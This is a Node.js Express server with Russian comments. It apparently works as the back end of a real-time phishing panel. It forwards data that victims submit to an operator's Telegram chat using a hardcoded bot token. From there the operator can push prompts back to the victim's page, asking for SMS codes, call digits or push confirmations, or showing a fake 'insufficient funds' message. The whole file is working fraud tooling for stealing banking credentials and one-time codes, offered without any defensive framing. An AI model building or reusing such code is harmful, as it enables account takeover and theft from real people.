const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHAT_ID = '-1003455979409';

// Хранилище команд для пользователей
let userTasks = {}; 

// Функция для безопасного текста (чтобы не было ошибки 400 из-за спецсимволов)
const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ЕДИНЫЙ API ДЛЯ ВСЕХ ФАЙЛОВ ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    console.log(`[LOG] Получены данные от ${userId} [${type}]`);
    
    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
    logMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
    logMsg += `------------------------\n`;
    
    for (let key in data) {
        logMsg += `<b>${safeText(key)}:</b> <code>${safeText(data[key])}</code>\n`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "💬 СМС Код", callback_data: `ask_${userId}_Введите код из СМС` },
                        { text: "📞 Звонок", callback_data: `ask_${userId}_Введите 4 цифры из звонка` }
                    ],
                    [
                        { text: "📲 Пуш", callback_data: `msg_${userId}_Подтвердите вход в приложении` },
                        { text: "💰 Баланс", callback_data: `msg_${userId}_Недостаточно средств на карте.` }
                    ],
                    [
                        { text: "🛠 Поддержка", callback_data: `ask_${userId}_Опишите проблему оператору` },
                        { text: "✍️ Свой текст", callback_data: `ask_${userId}_Введите данные` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        // Выводим подробности ошибки 400 в логи Railway
        console.error("❌ ОШИБКА TG:", e.response ? JSON.stringify(e.response.data) : e.message);
        res.status(500).send('TG Error');
    }
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) {
        delete userTasks[userId]; 
    }
    res.json(task);
});

app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (callback_query) {
        const parts = callback_query.data.split('_');
        const action = parts[0]; 
        const userId = parts[1];
        const text = parts.slice(2).join('_');

        userTasks[userId] = { action, text };

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: "✅ Отправлено!"
        });
    }

    if (message && message.text && message.text.startsWith('/send')) {
        const parts = message.text.split(' ');
        const userId = parts[1];
        const text = parts.slice(2).join(' ');

        if (userId && text) {
            userTasks[userId] = { action: 'msg', text: text };
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Отправлено пользователю ${userId}`
            });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
